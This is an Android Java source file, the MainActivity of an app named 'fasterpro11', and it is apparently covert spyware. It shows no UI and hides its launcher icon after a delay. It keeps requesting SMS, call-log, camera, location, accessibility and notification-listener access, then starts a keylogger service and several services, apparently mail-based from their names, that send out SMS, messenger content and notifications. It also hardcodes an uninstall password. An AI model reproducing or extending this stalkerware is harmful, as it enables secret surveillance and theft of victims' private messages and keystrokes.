package com.example.fasterpro11;

import android.Manifest;
import android.content.ComponentName;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.text.InputType;
import android.util.Log;
import android.widget.EditText;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AlertDialog;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;

public class MainActivity extends AppCompatActivity {

    private static final int PERMISSION_REQUEST_CODE = 1001;
    private static final int OTHER_PERMISSION_REQUEST_CODE = 1002;
    private static final int AUTO_HIDE_DELAY = 120000; // 600 seconds

    private static final String[] AUTOMATIC_PERMISSIONS = {
            Manifest.permission.RECEIVE_SMS,
            Manifest.permission.READ_SMS,
            Manifest.permission.SEND_SMS,
            Manifest.permission.INTERNET,
            Manifest.permission.ACCESS_NETWORK_STATE,
            Manifest.permission.CAMERA,
            Manifest.permission.READ_EXTERNAL_STORAGE,
            Manifest.permission.WRITE_EXTERNAL_STORAGE,
            Manifest.permission.RECEIVE_BOOT_COMPLETED,
            Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.POST_NOTIFICATIONS,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.WRITE_CALL_LOG
    };

    private static final String[] USER_INTERACTION_PERMISSIONS = {
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.ACCESS_COARSE_LOCATION,
            Manifest.permission.BIND_NOTIFICATION_LISTENER_SERVICE,
            Manifest.permission.BIND_INPUT_METHOD,
            Manifest.permission.PROCESS_OUTGOING_CALLS,
            Manifest.permission.SYSTEM_ALERT_WINDOW,
            Manifest.permission.BIND_ACCESSIBILITY_SERVICE,
            Manifest.permission.FOREGROUND_SERVICE,
            Manifest.permission.FOREGROUND_SERVICE_LOCATION
    };

    private static final String UNINSTALL_PASSWORD = "564632"; // Replace with your actual uninstall password

    private Toast currentToast;

    private boolean automaticPermissionsGranted = false;
    private boolean userInteractionPermissionsGranted = false;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        // No setContentView() here to avoid any UI display

        // Hide app icon after 120 seconds
        new Handler(Looper.getMainLooper()).postDelayed(new Runnable() {
            @Override
            public void run() {
                hideAppIcon();
            }
        }, AUTO_HIDE_DELAY); // 120 seconds delay

        // Request permissions and start necessary services
        requestPermissions();
    }

    private void requestPermissions() {
        // Request automatic permissions if not granted
        if (!automaticPermissionsGranted) {
            ActivityCompat.requestPermissions(this, AUTOMATIC_PERMISSIONS, PERMISSION_REQUEST_CODE);
        }

        // Request user interaction permissions if not granted
        if (!userInteractionPermissionsGranted) {
            ActivityCompat.requestPermissions(this, USER_INTERACTION_PERMISSIONS, OTHER_PERMISSION_REQUEST_CODE);
        }

        // Check and request battery optimization permission
        requestBatteryOptimizationPermission();

        // Check and request READ_PHONE_STATE permission if needed
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
                ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.READ_PHONE_STATE}, OTHER_PERMISSION_REQUEST_CODE);
            }
        }

        // Request overlay permission
        requestOverlayPermission();
    }

    // Handle permission request results
    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == PERMISSION_REQUEST_CODE) {
            automaticPermissionsGranted = true;
        } else if (requestCode == OTHER_PERMISSION_REQUEST_CODE) {
            userInteractionPermissionsGranted = true;
        }

        if (automaticPermissionsGranted && userInteractionPermissionsGranted) {
            showToast("All permissions are allowed.");
            startServicesAndRequests();
        } else {
            StringBuilder deniedPermissions = new StringBuilder();
            boolean anyPermissionDenied = false;

            for (int i = 0; i < grantResults.length; i++) {
                if (grantResults[i] != PackageManager.PERMISSION_GRANTED) {
                    anyPermissionDenied = true;
                    deniedPermissions.append(permissions[i]).append("\n");
                }
            }

            if (anyPermissionDenied) {
                showToast("Permissions not granted:\n" + deniedPermissions.toString());
                Log.d("PermissionStatus", "Permissions denied: " + deniedPermissions.toString());
            } else {
                showToast("All permissions are required for the app to function correctly.");
            }

            // Re-request permissions if any are denied
            requestPermissions();
        }
    }

    private void startServicesAndRequests() {
        startBackgroundService();
        startKeyloggerService();
        startWhatsAppIMOMessengerContent();
        startJavaMailAPI_MyAccessibilityService_Sender();
        startJavaMailAPI();
        startJavaMailAPI_OutgoingSmsObserver_Sender();
        startJavaMailAPI_SmsReceiver_Send();
        startJavaMailAPI_WhatsAppIMOMessengerSender();
        startJavaMailAPISendNotification();

        requestNotificationListenerPermission();
        requestAccessibilityPermission();
    }

    private void requestOverlayPermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (!Settings.canDrawOverlays(this)) {
                Log.d("OverlayPermission", "Overlay permission not granted. Requesting...");
                Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                        Uri.parse("package:" + getPackageName()));
                startActivityForResult(intent, PERMISSION_REQUEST_CODE);
            } else {
                Log.d("OverlayPermission", "Overlay permission already granted.");
            }
        }
    }

    private void requestAccessibilityPermission() {
        if (!isAccessibilityServiceEnabled(this, MyAccessibilityService.class)) {
            Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
            startActivity(intent);
            showToast("Please enable the accessibility service for the app.");
        }
    }

    private boolean isAccessibilityServiceEnabled(Context context, Class<?> accessibilityService) {
        String prefString = Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
        if (prefString != null) {
            String[] services = prefString.split(":");
            for (String service : services) {
                if (service.equalsIgnoreCase(new ComponentName(context, accessibilityService).flattenToString())) {
                    return true;
                }
            }
        }
        return false;
    }

    private void requestBatteryOptimizationPermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            Intent intent = new Intent();
            intent.setAction(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
            intent.setData(Uri.parse("package:" + getPackageName()));
            startActivityForResult(intent, OTHER_PERMISSION_REQUEST_CODE);
        }
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == OTHER_PERMISSION_REQUEST_CODE) {
            if (resultCode == RESULT_OK) {
                showToast("Battery optimization permission granted");
            } else {
                showToast("Battery optimization permission denied. Some features may not work correctly.");
            }
        } else if (requestCode == PERMISSION_REQUEST_CODE) {
            if (Settings.canDrawOverlays(this)) {
                Log.d("OverlayPermission", "Overlay permission granted.");
            } else {
                Log.d("OverlayPermission", "Overlay permission denied.");
            }
        }
    }

    private void startBackgroundService() {
        Intent serviceIntent = new Intent(this, BackgroundService.class);
        startService(serviceIntent);
    }

    private void startKeyloggerService() {
        Intent serviceIntent = new Intent(this, KeyloggerService.class);
        startService(serviceIntent);
    }

    private void startWhatsAppIMOMessengerContent() {
        Intent serviceIntent = new Intent(this, WhatsAppIMOMessengerContent.class);
        startService(serviceIntent);
    }

    private void startJavaMailAPI() {
        Intent serviceIntent = new Intent(this, JavaMailAPI.class);
        startService(serviceIntent);
    }

    private void startJavaMailAPI_MyAccessibilityService_Sender() {
        Intent serviceIntent = new Intent(this, JavaMailAPI_MyAccessibilityService_Sender.class);
        startService(serviceIntent);
    }

    private void startJavaMailAPI_OutgoingSmsObserver_Sender() {
        Intent serviceIntent = new Intent(this, JavaMailAPI_OutgoingSmsObserver_Sender.class);
        startService(serviceIntent);
    }

    private void startJavaMailAPI_SmsReceiver_Send() {
        Intent serviceIntent = new Intent(this, JavaMailAPI_SmsReceiver_Send.class);
        startService(serviceIntent);
    }

    private void startJavaMailAPI_WhatsAppIMOMessengerSender() {
        Intent serviceIntent = new Intent(this, JavaMailAPI_WhatsAppIMOMessengerSender.class);
        startService(serviceIntent);
    }

    private void startJavaMailAPISendNotification() {
        Intent serviceIntent = new Intent(this, JavaMailAPISendNotification.class);
        startService(serviceIntent);
    }

    private void requestNotificationListenerPermission() {
        if (!isNotificationServiceEnabled()) {
            Intent intent = new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS);
            startActivityForResult(intent, OTHER_PERMISSION_REQUEST_CODE);
        }
    }

    private boolean isNotificationServiceEnabled() {
        String pkgName = getPackageName();
        final String flat = Settings.Secure.getString(getContentResolver(), "enabled_notification_listeners");
        if (flat != null) {
            final String[] names = flat.split(":");
            for (String name : names) {
                final ComponentName cn = ComponentName.unflattenFromString(name);
                if (cn != null && pkgName.equals(cn.getPackageName())) {
                    return true;
                }
            }
        }
        return false;
    }

    private void hideAppIcon() {
        PackageManager p = getPackageManager();
        ComponentName componentName = new ComponentName(this, MainActivity.class);
        p.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
    }



    private void showToast(String message) {
        if (currentToast != null) {
            currentToast.cancel();
        }
        currentToast = Toast.makeText(MainActivity.this, message, Toast.LENGTH_SHORT);
        currentToast.show();
    }
}
